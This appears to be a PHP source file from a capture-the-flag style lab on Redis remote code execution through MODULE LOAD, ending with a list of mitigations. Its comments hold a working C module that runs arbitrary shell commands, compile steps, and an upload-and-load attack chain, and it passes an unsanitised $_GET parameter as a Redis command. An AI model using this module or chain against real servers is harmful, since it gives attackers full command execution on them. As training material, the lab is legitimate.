<?php
// ============================================================
// Lab 5: MODULE LOAD. Remote Code Execution (Source Code)
// ============================================================
// Engine: Redis (Simulated) with Module Support
// Data: /home/kali/SQLi-Arena/data/redis/lab5.json
// ============================================================

// Redis 4.0+ supports dynamically loaded modules via shared objects (.so)
// These modules can register new commands with full access to:
//   - Redis keyspace
//   - System calls (execve, popen, etc.)
//   - Network sockets
//   - File system

// --- Malicious Module Example (C code) ---
/*
 * #include "redismodule.h"
 * #include <stdlib.h>
 *
 * int SystemExecCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
 *     if (argc != 2) return RedisModule_WrongArity(ctx);
 *     size_t len;
 *     const char *cmd = RedisModule_StringPtrLen(argv[1], &len);
 *     FILE *fp = popen(cmd, "r");
 *     char buf[4096] = {0};
 *     fread(buf, 1, sizeof(buf)-1, fp);
 *     pclose(fp);
 *     return RedisModule_ReplyWithSimpleString(ctx, buf);
 * }
 *
 * int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
 *     RedisModule_Init(ctx, "system", 1, REDISMODULE_APIVER_1);
 *     RedisModule_CreateCommand(ctx, "system.exec", SystemExecCommand,
 *                               "write", 0, 0, 0);
 *     return REDISMODULE_OK;
 * }
 */

// Compile: gcc -fPIC -shared -o evil.so module.c
// Upload: via CONFIG SET file write (Lab 3) or rogue SLAVEOF sync (Lab 4)

// --- Attack Chain ---
$cmd = $_GET['cmd'];  // User-controlled Redis command

// Step 1: Upload the .so file to the server
// (Using CONFIG SET dir/dbfilename from Lab 3, or rogue server from Lab 4)

// Step 2: Load the module
// MODULE LOAD /tmp/evil.so
// Response: OK: new commands: system.exec, system.rev

// Step 3: Execute system commands
// system.exec id
// Response: uid=999(redis) gid=999(redis)

// system.exec cat /flag.txt
// Response: FLAG{rd_m0dul3_l04d_rc3}

// --- Why is this dangerous? ---
// MODULE LOAD provides FULL RCE with the privileges of the Redis process.
// Redis modules have unrestricted access to:
//   - System calls (exec, fork, socket)
//   - File system (read/write any file Redis can access)
//   - Network (connect to other hosts, bind ports)
//   - Redis internals (read/write all keys, intercept commands)

// --- Mitigations ---
// 1. rename-command MODULE ""  (disable MODULE command entirely)
// 2. Set enable-module-command no (Redis 7.0+)
// 3. Use loadmodule in config file only (startup-time loading)
// 4. requirepass with strong password
// 5. ACL: restrict MODULE command to admin users only
// 6. Read-only file system / container isolation
// 7. Disable CONFIG SET to prevent file upload via dump
?>
